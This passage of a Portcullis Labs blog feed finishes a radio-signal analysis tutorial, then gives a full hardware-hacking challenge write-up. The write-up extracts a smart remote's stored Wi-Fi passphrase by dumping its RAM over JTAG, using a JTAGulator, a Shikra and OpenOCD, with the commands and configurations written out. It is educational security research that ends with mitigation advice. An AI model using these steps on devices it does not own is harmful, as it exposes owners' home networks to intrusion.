+<div id="attachment_6370" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6304"><div class="lb-album"><a href="#image-6304"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1406371-300x113.png" alt="Measuring multiple pulses" class="size-medium wp-image-6370"><span></span></a></div>              
+<a href="#imageclose-6304" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6304">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1406371.png" alt="image-6304">
+                   </div></a><p class="wp-caption-text">Measuring multiple pulses</p></div>
+<p>More like 15.58KHz.</p>
+<p>If you suspect you&#8217;ve got a <a title="Manchester Encoded" href="https://en.wikipedia.org/wiki/Manchester_code">Manchester Encoded</a> signal (as we seem to have here), you can expand the slider so that each segment covers two pulses.</p>
+<div id="attachment_6371" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6305"><div class="lb-album"><a href="#image-6305"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1408071-300x100.png" alt="Cursors used for Manchester Encoding" class="size-medium wp-image-6371"><span></span></a></div>              
+<a href="#imageclose-6305" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6305">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1408071.png" alt="image-6305">
+                   </div></a><p class="wp-caption-text">Cursors used for Manchester Encoding</p></div>
+<p>As required for Manchester Encoding, each segment includes either a high-to-low transition or a low-to-high transition, but never high-to-high or low-to-low.</p>
+<p>That concludes a walkthrough of using inspectrum to look at FSK modulated signals. We&#8217;ve seen how to confirm we have an FSK signal by looking for square wave in the FFT plot &#8211; i.e. a signal that hops between two (or more) distinct frequencies. We showed how to tweak the sliders to get a nice clear view of the signal, trading off resolution in the frequency domain for resolution in the time domain. We used cursors to show we can take measurements of the baudrate of the signal.</p>
+<h2>Example 2: ASK/OOK signal</h2>
+<p>For this example we use an RF remote for a mains remote.</p>
+<p>Having covered how to use inspectrum in the FSK section above, we&#8217;ll go into less detail in this section.</p>
+<p>Upon loading the capture file we&#8217;re presented with what looks like 8 repeating signals. We&#8217;ll drill into one of those and try to see the 1&#8242;s and 0&#8242;s:</p>
+<div id="attachment_6379" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6306"><div class="lb-album"><a href="#image-6306"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_162655-300x115.png" alt="8 repeating signals?" class="size-medium wp-image-6379"><span></span></a></div>              
+<a href="#imageclose-6306" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6306">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_162655.png" alt="image-6306">
+                   </div></a><p class="wp-caption-text">8 repeating signals?</p></div>
+<p>Adjusting the Power slides as before we can filter out the background noise and more easily see our signal of interest:</p>
+<div id="attachment_6380" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6307"><div class="lb-album"><a href="#image-6307"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_162720-300x110.png" alt="Filtering out background noise" class="size-medium wp-image-6380"><span></span></a></div>              
+<a href="#imageclose-6307" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6307">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_162720.png" alt="image-6307">
+                   </div></a><p class="wp-caption-text">Filtering out background noise</p></div>
+<p>Using the zoom feature, we can start to see the 1&#8242;s and 0&#8242;s pretty quickly.</p>
+<div id="attachment_6381" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6308"><div class="lb-album"><a href="#image-6308"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_162759-300x117.png" alt="Locating 1' class="size-medium wp-image-6381"><span></span></a></div>              
+<a href="#imageclose-6308" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6308">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_162759.png" alt="image-6308">
+                   </div></a><p class="wp-caption-text">Locating 1&#8242;s and 0&#8242;s with zoom slider</p></div>
+<p>In this case, though, unlike for FSK we&#8217;re not expecting to see a square wave, we&#8217;re expecting to see a single line with gaps in. Which is what we can already see. Furthermore we can start to figure out the 1&#8242;s and the o&#8217;s. Note that the signal above is composed of only the 2 patterns:</p>
+<ul>
+<li>Short line followed be long gap; or</li>
+<li>Long line followed by short gap</li>
+</ul>
+<p>One is our 1 and the other is our 0. At this stage it doesn&#8217;t really matter which. Only that we&#8217;d be able to describe any signal using 1&#8242;s and 0&#8242;s the way we define them.</p>
+<p>This is easier to see if we use the cursor feature:</p>
+<div id="attachment_6382" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6309"><div class="lb-album"><a href="#image-6309"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_174402-300x109.png" alt="Using cursors to highlight 1' class="size-medium wp-image-6382"><span></span></a></div>              
+<a href="#imageclose-6309" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6309">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_174402.png" alt="image-6309">
+                   </div></a><p class="wp-caption-text">Using cursors to highlight 1&#8242;s and 0&#8242;s</p></div>
+<p>If you&#8217;ve read the FSK section above, you may have been tempted (as I was) to slide the FFT slider to the left to improve the resolution in the time domain. If you do this, you&#8217;re able to see that the long line is composed for 4 short lines &#8211; of slightly different lengths!  This makes it really hard to spot the pattern being used for a 1 or 0 (unless you already know it). It doesn&#8217;t matter to us how the long or short line are generated. The fact that they aren&#8217;t continuous lines doesn&#8217;t matter and just causes confusion.  So, in this case we&#8217;ve shown that when investigating ASK/OOK signals, it&#8217;s best to start with the FFT slider on the right (limited resolution in the time domain) and only move if to the left if we&#8217;re unable to spot the pattern used for 1&#8242;s and 0&#8242;s.</p>
+<div id="attachment_6383" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6310"><div class="lb-album"><a href="#image-6310"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_185835-300x117.png" alt="Confusing patterns found by sliding FFT slider too far" class="size-medium wp-image-6383"><span></span></a></div>              
+<a href="#imageclose-6310" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6310">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_185835.png" alt="image-6310">
+                   </div></a><p class="wp-caption-text">Confusing patterns found by sliding FFT slider too far</p></div>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/adventures-in-rf-using-inspectrum-to-analyse-fsk-and-askook-signals/">Adventures in RF: Using Inspectrum to analyse FSK and ASK/OOK signals</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/adventures-in-rf-using-inspectrum-to-analyse-fsk-and-askook-signals/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>JTAG on-chip debugging: Extracting passwords from memory</title>
+		<link>https://labs.portcullis.co.uk/blog/jtag-on-chip-debugging-extracting-passwords-from-memory/</link>
+		<comments>https://labs.portcullis.co.uk/blog/jtag-on-chip-debugging-extracting-passwords-from-memory/#comments</comments>
+		<pubDate>Thu, 29 Mar 2018 08:30:55 +0000</pubDate>
+		<dc:creator><![CDATA[ISA]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[hardhack]]></category>
+		<category><![CDATA[training]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6160</guid>
+		<description><![CDATA[<p>Following on from my colleague&#8217;s post on using UART to root a phone, I look at another of our challenges, whereby sensitive information such as passwords can be extracted from a device&#8217;s memory if physical access to the device is acquired. The goal and target The target device is the BroadLink RM Pro universal remote [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/jtag-on-chip-debugging-extracting-passwords-from-memory/">JTAG on-chip debugging: Extracting passwords from memory</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Following on from my <a title="colleague's post on using UART to root a phone" href="/blog/uart-debugging-rooting-an-ip-phone-using-uart/">colleague&#8217;s post on using UART to root a phone</a>, I look at another of our challenges, whereby sensitive information such as passwords can be extracted from a device&#8217;s memory if physical access to the device is acquired.<span id="more-6160"></span></p>
+<h2>The goal and target</h2>
+<div id="attachment_6163" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6161"><div class="lb-album"><a href="#image-6161"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig1_broadlinkrmPro-300x240.jpg" alt="BroadLink RM Pro Smart Remote Control" class="size-medium wp-image-6163"><span></span></a></div>              
+<a href="#imageclose-6161" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6161">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig1_broadlinkrmPro.jpg" alt="image-6161">
+                   </div></a><p class="wp-caption-text">BroadLink RM Pro Smart Remote Control</p></div>
+<p>The target device is the BroadLink RM Pro universal remote control designed for home convenience and automation.</p>
+<p>This smart remote control can be used to control multiple home appliances through its application. It also allows users to create scenarios whereby multiple actions can be programmed and activated simultaneously. Device setup and functionality is accessed through the BroadLink e-Control application. This application must be running on a device connected to the same Wi-Fi network as the smart remote and the appliance you want to control.</p>
+<div id="attachment_6165" style="width: 178px" class="wp-caption aligncenter"><a name="imageclose-6162"><div class="lb-album"><a href="#image-6162"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig2_boradlink_econtrolapp-168x300.png" alt="BroadLink e-Control application" class="size-medium wp-image-6165"><span></span></a></div>              
+<a href="#imageclose-6162" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6162">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig2_boradlink_econtrolapp.png" alt="image-6162">
+                   </div></a><p class="wp-caption-text">BroadLink e-Control application</p></div>
+<p>For the purpose of this challenge, setting up the device is required. In a real scenario, the device would likely already be set up.</p>
+<p>Start by connecting the smart remote to a Wi-Fi network and entering the Wi-Fi SSID and Passphrase within the e-Controls application. The application then subsequently tries to locate the device within the network and once it is found, a connection is established.</p>
+<p>Now that the smart remote is functional, an attacker who has physical access to the device may attempt to extract configuration or sensitive information loaded in memory. Successfully replicating this attack scenario is the main goal of this challenge.</p>
+<h2>Taking a look inside</h2>
+<p>The first step is to investigate the internal components of the device, starting by carefully taking apart the unit. There are three easily removable housing screws situated on the underside of the device.</p>
+<p>Once opened, we can then identify different points of interest within the device. These can be internal or external ports, the board&#8217;s chips, components, model and serial numbers. Identifying the chip&#8217;s model and serial number is essential and will provide us with the information we need in latter stages.</p>
+<div id="attachment_6166" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6163"><div class="lb-album"><a href="#image-6163"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig3_inside_broadlinkrmpro-300x257.jpg" alt="Inside BroadLink RM Pro Smart remote" class="size-medium wp-image-6166"><span></span></a></div>              
+<a href="#imageclose-6163" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6163">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig3_inside_broadlinkrmpro.jpg" alt="image-6163">
+                   </div></a><p class="wp-caption-text">Inside BroadLink RM Pro Smart remote</p></div>
+<p>Looking for ways to communicate with the device is another key step. When working with embedded architectures, the presence of debug interfaces such as UART and JTAG is a common method used to establish serial connectivity to the device.</p>
+<h2>JTAG</h2>
+<p>Joint Test Action Group or more simply JTAG, is a standardised type of serial communication commonly used by engineers and developers to perform on-board testing or diagnostics of embedded devices, also known as boundary scanning. Another functionality of JTAG, which is seemingly more used today, is CPU level debugging allowing read-write access to registers and memory.</p>
+<p>The JTAG interface uses four connection points also known as Test Access Port or TAP. These connection points correspond to four signals:</p>
+<ul>
+<li>TDI &#8211; Test Data In; this signal represents input data sent to the device</li>
+<li>TDO &#8211; Test Data Out, which represents output data from the device</li>
+<li>TCK &#8211; Test Clock, used to synchronise data from the TMS and TDI (rising edge of Test Clock) and TDO (falling edge of Test Clock)</li>
+<li>TMS &#8211; Test Mode Select; this signal is used to control the state of the TAP controller</li>
+<li>TRST &#8211; Test Reset; this is an optional signal used for resetting the TAP controller</li>
+</ul>
+<h2>Identifying JTAG pinouts</h2>
+<p>The implementation of JTAG is non-standardised, which means that the signal pinouts you may encounter will vary between devices. Aside from the standalone JTAG connection points, commonly seen JTAG interfaces may be a part of a 10 pin, 14 pin, 16 or 20 pin header.</p>
+<div id="attachment_6167" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6164"><div class="lb-album"><a href="#image-6164"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig4_jtag_pinouts-300x225.jpg" alt="JTAG pinouts" class="size-medium wp-image-6167"><span></span></a></div>              
+<a href="#imageclose-6164" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6164">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig4_jtag_pinouts.jpg" alt="image-6164">
+                   </div></a><p class="wp-caption-text">JTAG pinouts</p></div>
+<p>Looking closely at the device, the five connection points on the corner of the board is the JTAG interface. Using the JTAG&#8217;s debugging functionality should enable us to read and write data stored in memory.</p>
+<p>Note: Some devices will have JTAG present but their connections will have been disabled before being released into production.</p>
+<p>There are various tools available which can be used to identify JTAG signal pinouts, all of which vary in available features and pricing. Common examples are JTAGenum (for Arduino), JTAGulator and Hydrabus to name a few. For the purpose of this challenge, a JTAGulator is used. The JTAGulator supports a number of functionalities, including both the identification of UART and JTAG pinouts.</p>
+<div id="attachment_6170" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6165"><div class="lb-album"><a href="#image-6165"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig5_jtagulator-300x146.jpg" alt="The JTAGulator" class="size-medium wp-image-6170"><span></span></a></div>              
+<a href="#imageclose-6165" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6165">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig5_jtagulator.jpg" alt="image-6165">
+                   </div></a><p class="wp-caption-text">The JTAGulator</p></div>
+<h2>Connecting the JTAGulator</h2>
+<p>The JTAGulator is connected to the smart remote starting from the lowest number of channels/pins on the board (CH0-CH4). The lowest numbered pinouts are used due to the brute-force method used by the JTAGulator to identify the signal value for each pinout. Using the lowest pin number decreases the number of permutation to iterate through and ultimately speeds up the identification process.</p>
+<div id="attachment_6171" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6166"><div class="lb-album"><a href="#image-6166"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig6_jtagulator_connected-300x271.jpg" alt="JTAGulator connected to the device' class="size-medium wp-image-6171"><span></span></a></div>              
+<a href="#imageclose-6166" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6166">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig6_jtagulator_connected.jpg" alt="image-6166">
+                   </div></a><p class="wp-caption-text">JTAGulator connected to the device&#8217;s JTAG pins</p></div>
+<p>Once connected, you can control using the JTAGulator via USB connection, which will appear as a serial interface. A number of terminal emulators such as PuTTY, Hyperterminal or Minicom can be used to interface with the JTAGulator. In this instance, we will use ‘screen&#8217; utility, which is installed by default on many Linux distributions. It can be used to establish a serial connection to the JTAGulator via the default ttyUSB0 device in Linux machines. The JTAGulator&#8217;s baudrate of 115200 should also be provided like so:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ sudo screen /dev/ttyUSB0 115200
+</pre>
+<p>Once a serial connection to the JTAGulator is established, pressing the ‘h&#8217; key shows a list of JTAG commands available. The first step is to set the target voltage to 3.3V, which pertains to the voltage required by the microprocessor. 3.3V is commonly used by most chips; however, accurate information regarding the operational voltage can be found by looking through the chip&#8217;s specification sheet. Setting the correct voltage is important as an incorrect voltage could damage or destroy the device. After setting the voltage, the &#8220;Identify JTAG pinout (IDCODE Scan) can be used to identify JTAG pins, which works by reading the device IDs &#8211; specifically, TDO, TMS and TCK signals. To identify the TDI pin, the BYPASS scan is used.</p>
+<p>When running the scans, enter the number of channels to use as five; this will allow the JTAGulator to use the connections made channels CH0 to CH4. The scans should complete fairly quickly as there are only five pins exposed in the board, resulting in a lower number of permutations to be made. If the JTAG implementation appears alongside multiple pinouts, this can increase the number of permutations, thus increasing the duration of the scan.</p>
+<div id="attachment_6172" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6167"><div class="lb-album"><a href="#image-6167"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig7_jtagulating_identification-300x111.png" alt="Identifying JTAG pinouts (BYPASS scan)" class="size-medium wp-image-6172"><span></span></a></div>              
+<a href="#imageclose-6167" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6167">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig7_jtagulating_identification.png" alt="image-6167">
+                   </div></a><p class="wp-caption-text">Identifying JTAG pinouts (BYPASS scan)</p></div>
+<p>The result of the BYPASS scan show us the location of the signal pinouts on the JTAGulator, which corresponds to the signal pinouts on the smart remote.</p>
+<p>You can skip this step entirely if the JTAG pinouts are labelled on the silkscreen print on the board, so do not forget to check both sides of the PCB, as it may save valuable time.</p>
+<div id="attachment_6173" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6168"><div class="lb-album"><a href="#image-6168"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig8_jtag_signal_reverse-300x292.jpg" alt="JTAG signal pinouts printed underneath the board" class="size-medium wp-image-6173"><span></span></a></div>              
+<a href="#imageclose-6168" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6168">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig8_jtag_signal_reverse.jpg" alt="image-6168">
+                   </div></a><p class="wp-caption-text">JTAG signal pinouts printed underneath the board</p></div>
+<h2>The Shikra</h2>
+<p>In order for us to get debug access on the smart remote, an interface and some form of OCD (On Chip Debugger) is required. Many devices on the market allow interfacing with JTAG to facilitate on chip debugging, such as Bus Pirate, Shikra and HydraBus. For this scenario, the Shikra and OpenOCD software are used.</p>
+<p>The Shikra is an FT232H USB device sometimes referred to as the &#8220;Swiss army knife of hardware hacking&#8221;; this device allows us to connect to a number of data interfaces, including UART, JTAG and SPI. A Shikra can be purchased from Xipiter: <a href="https://int3.cc/products/the-shikra">https://int3.cc/products/the-shikra</a>.</p>
+<div id="attachment_6174" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6169"><div class="lb-album"><a href="#image-6169"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig9_shikra-300x168.jpg" alt="The Shikra" class="size-medium wp-image-6174"><span></span></a></div>              
+<a href="#imageclose-6169" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6169">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig9_shikra.jpg" alt="image-6169">
+                   </div></a><p class="wp-caption-text">The Shikra</p></div>
+<p>The following diagram shows the Shikra pinouts for JTAG, which will be used to connect to the board&#8217;s corresponding JTAG pinouts. Ensure that the ground (GND) pin is also connected to a ground point on the board.</p>
+<div id="attachment_6190" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6170"><div class="lb-album"><a href="#image-6170"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig10_shikra_jtag_connections-300x231.png" alt="Shikra JTAG connections http://www.xipiter.com/uploads/2/4/4/8/24485815/shikra_documentation.pdf" class="size-medium wp-image-6190"><span></span></a></div>              
+<a href="#imageclose-6170" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6170">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig10_shikra_jtag_connections.png" alt="image-6170">
+                   </div></a><p class="wp-caption-text">Shikra JTAG connections http://www.xipiter.com/uploads/2/4/4/8/24485815/shikra_documentation.pdf</p></div>
+<div id="attachment_6191" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6171"><div class="lb-album"><a href="#image-6171"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig11_shikra_to_usb-300x228.jpg" alt="The Shikra giving serial to USB connectivity" class="size-medium wp-image-6191"><span></span></a></div>              
+<a href="#imageclose-6171" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6171">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig11_shikra_to_usb.jpg" alt="image-6171">
+                   </div></a><p class="wp-caption-text">The Shikra giving serial to USB connectivity</p></div>
+<h2>OpenOCD</h2>
+<p>OpenOCD allows us to perform on-chip debugging of the smart remote via JTAG using GDB. In Linux-based systems, you can install the OpenOCD package by running the following command:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ sudo apt-get install openocd
+</pre>
+<p>In order for us to use OpenOCD, a configuration file for the interface (Shikra) and the target (Smart remote) are required. OpenOCD comes with a number of pre-installed interface and target configuration files; however, the one required does not come in the pre-installed list. The configuration file for the adapter can be found in Xipiter&#8217;s <a title="getting started guide for the Shikra" href="http://www.xipiter.com/musings/using-the-shikra-to-attack-embedded-systems-getting-started">getting started guide for the Shikra</a>.</p>
+<p>Shikra OpenOCD configuration file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+#shikra.cfg
+interface ftdi
+ftdi_vid_pid 0x0403 0x6014
+
+ftdi_layout_init 0x0c08 0x0f1b
+adapter_khz 2000
+#end shikra.cfg
+</pre>
+<p>Obtaining the configuration file for the target was not as straight forward. The configuration file required was not available within the pre-installed configuration files and attempting to use any of them results in compatibility errors with the device.</p>
+<p>The approach taken in identifying the appropriate target configuration file involved looking up the microprocessor&#8217;s make and model. Using a magnifying glass or a good enough camera, the specific chip printings can be determined. The chip in question is a Marvell 88MC200 and a simple Google search of this chip and the keyword OpenOCD returns the <a title="target configuration" href="http://openocd.zylin.com/#/c/2553/2/tcl/target/mc200.cfg">target configuration</a> needed.</p>
+<pre class="brush: bash; highlight: [7]; title: ; notranslate">
+#
+# Marvell's Wireless Microcontroller Platform (88MC200)
+#
+# https://origin-www.marvell.com/microcontrollers/wi-fi-microcontroller-platform/
+#
+
+#source [find interface/ftdi/mc200.cfg]
+
+if &quot; [info exists CHIPNAME] &quot; &quot;
+   set  _CHIPNAME $CHIPNAME
+&quot; else &quot;
+   set  _CHIPNAME mc200
+&quot;
+
+set  _ENDIAN little
+
+# Work-area is a space in RAM used for flash programming
+# By default use 16kB
+if &quot; [info exists WORKAREASIZE] &quot; &quot;
+   set  _WORKAREASIZE $WORKAREASIZE
+&quot; else &quot;
+   set  _WORKAREASIZE 0x4000
+&quot;
+
+# JTAG scan chain
+if &quot; [info exists CPUTAPID ] &quot; &quot;
+   set _CPUTAPID $CPUTAPID
+&quot; else &quot;
+   set _CPUTAPID 0x4ba00477
+&quot;
+
+jtag newtap $_CHIPNAME cpu -irlen 4 -ircapture 0x1 -irmask 0xf -expected-id $_CPUTAPID
+
+set _TARGETNAME $_CHIPNAME.cpu
+target create $_TARGETNAME cortex_m -endian $_ENDIAN -chain-position $_TARGETNAME
+$_TARGETNAME configure -work-area-phys 0x2001C000 -work-area-size $_WORKAREASIZE -work-area-backup 0
+
+# Flash bank
+set _FLASHNAME $_CHIPNAME.flash
+flash bank $_FLASHNAME mrvlqspi 0x0 0 0 0 $_TARGETNAME 0x46010000
+
+# JTAG speed should be &lt;= F_CPU/6. F_CPU after reset is 32MHz
+# so use F_JTAG = 3MHz
+adapter_khz 3000
+adapter_nsrst_delay 100
+if &quot;[using_jtag]&quot; &quot;
+ jtag_ntrst_delay 100
+&quot;
+
+if &quot;![using_hla]&quot; &quot;
+   # if srst is not fitted use SYSRESETREQ to
+   # perform a soft reset
+   cortex_m reset_config sysresetreq
+&quot;</pre>
+<p>The above configuration file was pointing to an interface path (line 7) which in our case was not required and therefore has been commented out. The interface configuration file previously downloaded will be used instead and the file location specified as a command line argument in OpenOCD.</p>
+<p>Once both target and interface configuration files are saved locally, run the following OpenOCD command:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ openocd -f /usr/share/openocd/scripts/interface/shikra.cfg -f /usr/share/openocd/scripts/target/mc200.cfg
+</pre>
+<p>The file path points to shikra.cfg file, which contains the interface configuration and mc200.cfg contains the target board configuration.</p>
+<p>The on-chip debugger should now be running as a server and will open local port 4444 on your system. You can then simply connect to this port with Telnet:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ telnet localhost 4444
+</pre>
+<h2>Dumping the device memory</h2>
+<p>Once connected, debug access to the board is now possible and allows control of registers and memory address.</p>
+<p>Before the registers can be accessed, sending a halt request is required to send the target into a debugging state. After sending the halt request, the reg command is used to view all of the available registers and its values on the device&#8217;s CPU. The full list of useful commands is available in the <a title="OpenOCD documentation" href="http://openocd.org/doc/html/General-Commands.html">OpenOCD documentation</a>.</p>
+<div id="attachment_6192" style="width: 212px" class="wp-caption aligncenter"><a name="imageclose-6172"><div class="lb-album"><a href="#image-6172"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig12_register_values-202x300.png" alt="Registers values shown in OpenOCD" class="size-medium wp-image-6192"><span></span></a></div>              
+<a href="#imageclose-6172" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6172">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig12_register_values.png" alt="image-6172">
+                   </div></a><p class="wp-caption-text">Registers values shown in OpenOCD</p></div>
+<p>Highlighted in the above image is the Stack Pointer (SP) register. Discussing how computer addressing works is beyond the scope of this blog (it is not a simple subject!). For now, it is enough to understand that the location of the Stack Pointer contains the last value pushed onto the stack of things in memory (RAM), serving as the starting address from where user space memory can be accessed.</p>
+<p>Going back to the original goal of extracting sensitive information from the device, the &#8220;dump_image&#8221; command can be used to dump memory content (in hex). To successfully dump as much information as possible, a trial and error approach to identify the boundaries of user space memory can be taken.</p>
+<p>The dump_image command can be used as follows:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ dump_image img_out2 0x20002898 120000
+</pre>
+<p>The img_out2 argument is the output filename; the next argument is the Stack Pointer address and finally the amount of memory to dump in bytes.</p>
+<div id="attachment_6193" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6173"><div class="lb-album"><a href="#image-6173"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig13_duming_to_file-300x112.png" alt="Dumping memory to a file" class="size-medium wp-image-6193"><span></span></a></div>              
+<a href="#imageclose-6173" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6173">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig13_duming_to_file.png" alt="image-6173">
+                   </div></a><p class="wp-caption-text">Dumping memory to a file</p></div>
+<p>The image above shows that initial attempts at dumping memory may fail if a larger amount of bytes than what is available is specified.</p>
+<p>After successfully dumping the contents of memory in hex, an analysis of the file can be performed to identify any information that might be of interest.</p>
+<div id="attachment_6194" style="width: 310px" class="wp-caption aligncenter"><a name="imageclose-6174"><div class="lb-album"><a href="#image-6174"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig14_wifi_passphrase-300x191.png" alt="Wi-Fi passphrase next to the SSID" class="size-medium wp-image-6194"><span></span></a></div>              
+<a href="#imageclose-6174" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6174">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/fig14_wifi_passphrase.png" alt="image-6174">
+                   </div></a><p class="wp-caption-text">Wi-Fi passphrase next to the SSID</p></div>
+<p>A hex editor of your choice can be used to navigate around the contents of the file and in the example above, we have used Ghex. Looking around the file and by performing a quick search, we can see the SSID name the device is connected to. 18 bytes after it, the passphrase was also shown.</p>
+<p>If we had purchased this device second-hand, then we could potentially use it to access someone&#8217;s home network and launch further attacks.</p>
+<h2>Conclusion</h2>
+<p>Cyber attacks on smart home devices should now be recognised by home consumers, as well as the risks posed should these devices be sold or stolen. On the other hand, manufacturers should consider methods for securing the hardware aspect &#8211; the very foundation of these devices &#8211; to ensure the security and privacy of its users.</p>
+<p>Cisco&#8217;s hardware hacking challenges gives us the opportunity to learn different methods to tamper or attack a device, therefore promoting a greater understanding of the security risks and controls they present. This post has presented a simple proof-of-concept attack on a consumer smart device, whereby a user&#8217;s Wi-Fi passphrase can be extracted and therefore allow an attacker to achieve persistent access to a victim&#8217;s network. This type of attack can be prevented by disabling &#8211; or more effectively &#8211; removing the JTAG ports completely from production devices, thereby minimising its attack surface.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/jtag-on-chip-debugging-extracting-passwords-from-memory/">JTAG on-chip debugging: Extracting passwords from memory</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/jtag-on-chip-debugging-extracting-passwords-from-memory/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
